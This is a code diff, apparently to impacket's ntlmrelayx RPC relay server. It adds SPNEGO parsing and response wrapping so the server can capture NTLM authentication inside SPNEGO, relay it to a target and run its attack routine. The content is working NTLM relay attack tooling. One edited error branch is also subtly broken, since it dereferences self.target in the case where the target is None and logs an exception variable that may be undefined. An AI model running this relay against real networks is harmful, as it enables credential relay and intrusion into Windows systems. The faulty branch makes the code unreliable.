@@ -26,6 +26,7 @@ from impacket.dcerpc.v5.dcomrt import *
 from impacket.ntlm import NTLMSSP_AUTH_NEGOTIATE, NTLMSSP_AUTH_CHALLENGE_RESPONSE, NTLMSSP_AUTH_CHALLENGE
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS
+from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech, ASN1_AID, ASN1_SUPPORTED_MECH, MechTypes
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
@@ -50,6 +51,7 @@ class RPCRelayServer(Thread):
             self.request_pdu_data = None
             self.request_sec_trailer = None
             self.challengeMessage = None
+            self.useSpnego = False  # Track if SPNEGO is being used
             socketserver.BaseRequestHandler.__init__(self, request, client_address, server)
 
         def setup(self):
@@ -168,10 +170,9 @@ class RPCRelayServer(Thread):
                 LOG.error('(RPC): Packet contains "None" authentication')
                 return self.send_error(MSRPC_STATUS_CODE_RPC_S_BINDING_HAS_NO_AUTH)
             elif auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                if req_type == MSRPC_AUTH3:
-                    raise Exception('AUTH3 packet contains "SPNEGO" authentication')
-                # Negotiate NTLM!
-                raise NotImplementedError('SPNEGO auth_type not implemented yet')
+                if req_type not in (MSRPC_BIND, MSRPC_ALTERCTX):
+                    raise Exception('Packet type received not supported (yet): %s' % msrpc_message_type[req_type])
+                return self.negotiate_spnego_session()
             elif auth_type == RPC_C_AUTHN_WINNT or auth_type == RPC_C_AUTHN_DEFAULT:
                 # Great success!
                 if req_type not in (MSRPC_BIND, MSRPC_ALTERCTX, MSRPC_AUTH3):
@@ -185,8 +186,39 @@ class RPCRelayServer(Thread):
             else:
                 raise Exception('Auth type received not supported (yet): %d' % auth_type)
 
+        def negotiate_spnego_session(self):
+            securityBlob = self.request_header['auth_data']
+            self.useSpnego = True
+
+            if struct.unpack('B', securityBlob[0:1])[0] == ASN1_AID:
+                blob = SPNEGO_NegTokenInit(securityBlob)
+                token = blob['MechToken']
+                if len(blob['MechTypes'][0]) > 0:
+                    mechType = blob['MechTypes'][0]
+                    if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']:
+                        # Unsupported mechType
+                        if mechType in MechTypes:
+                            mechStr = MechTypes[mechType]
+                        else:
+                            from binascii import hexlify
+                            mechStr = hexlify(mechType)
+                        LOG.debug("(RPC): Unsupported MechType '%s'" % mechStr)
+                        respToken = SPNEGO_NegTokenResp()
+                        respToken['NegState'] = b'\x03'
+                        respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+                        return self.bind(respToken)
+            elif struct.unpack('B', securityBlob[0:1])[0] == ASN1_SUPPORTED_MECH:
+                # AUTH packet wrapped in SPNEGO
+                blob = SPNEGO_NegTokenResp(securityBlob)
+                token = blob['ResponseToken']
+
+            return self.negotiate_ntlm_session_with_token(token)
+
         def negotiate_ntlm_session(self):
             token = self.request_header['auth_data']
+            return self.negotiate_ntlm_session_with_token(token)
+
+        def negotiate_ntlm_session_with_token(self, token):
             messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]
 
             if messageType == NTLMSSP_AUTH_NEGOTIATE:
@@ -215,8 +247,8 @@ class RPCRelayServer(Thread):
                     # Connection failed
                     if self.target is None:
                         LOG.error('(RPC): Negotiating NTLM failed, and no target left')
+                        LOG.error('(RPC): Negotiating NTLM with %s://%s failed: %s', self.target.scheme, self.target.netloc, str(e))
                     else:
-                        LOG.error('(RPC): Negotiating NTLM with %s://%s failed.', self.target.scheme, self.target.netloc)
                         self.server.config.target.registerTarget(self.target)
                     return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
 
@@ -262,7 +294,16 @@ class RPCRelayServer(Thread):
                     self.server.config.target.registerTarget(self.target, True, self.auth_user)
 
                     self.do_attack()
-                    return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
+
+                    # If SPNEGO is being used, wrap the response in SPNEGO_NegTokenResp
+                    if self.useSpnego:
+                        respToken = SPNEGO_NegTokenResp()
+                        respToken['NegState'] = b'\x00'  # accept-completed
+                        respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+                        authData = respToken.getData()
+                        return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED, authData)
+                    else:
+                        return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
                 except Exception as e:
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                         LOG.error("(RPC): Authenticating against %s://%s as %s\\%s FAILED" % (
@@ -344,6 +385,16 @@ class RPCRelayServer(Thread):
             packet['flags'] = self.request_header['flags']
 
             if challengeMessage != b'':
+                # If SPNEGO is being used, wrap the NTLM challenge in SPNEGO_NegTokenResp
+                if self.useSpnego and not isinstance(challengeMessage, SPNEGO_NegTokenResp):
+                    respToken = SPNEGO_NegTokenResp()
+                    respToken['NegState'] = b'\x01'  # accept-incomplete
+                    respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
+                    respToken['ResponseToken'] = challengeMessage if isinstance(challengeMessage, bytes) else challengeMessage.getData()
+                    authData = respToken.getData()
+                else:
+                    authData = challengeMessage
+
                 secTrailer = SEC_TRAILER()
                 secTrailer['auth_type'] = self.request_sec_trailer['auth_type']
                 # TODO: Downgrading auth_level?
@@ -357,12 +408,12 @@ class RPCRelayServer(Thread):
                     secTrailer['auth_pad_len'] = pad
 
                 packet['sec_trailer'] = secTrailer
-                packet['auth_data'] = challengeMessage
-                packet['auth_len'] = len(challengeMessage)
+                packet['auth_data'] = authData
+                packet['auth_len'] = len(authData)
 
             return packet  # .get_packet()
 
-        def send_error(self, status):
+        def send_error(self, status, authData=b''):
             packet = MSRPCRespHeader(self.request_header.getData())
             request_type = self.request_header['type']
             if request_type == MSRPC_BIND:
@@ -371,6 +422,18 @@ class RPCRelayServer(Thread):
                 packet['type'] = MSRPC_FAULT
             if status:
                 packet['pduData'] = pack('<L', status)
+
+            # If we have auth data to return (e.g., SPNEGO response), add it
+            if authData != b'':
+                secTrailer = SEC_TRAILER()
+                secTrailer['auth_type'] = self.request_sec_trailer['auth_type']
+                secTrailer['auth_level'] = self.request_sec_trailer['auth_level']
+                secTrailer['auth_ctx_id'] = self.request_sec_trailer['auth_ctx_id']
+
+                packet['sec_trailer'] = secTrailer
+                packet['auth_data'] = authData
+                packet['auth_len'] = len(authData)
+
             return packet
 
         def do_ntlm_auth(self, token, authenticateMessage):
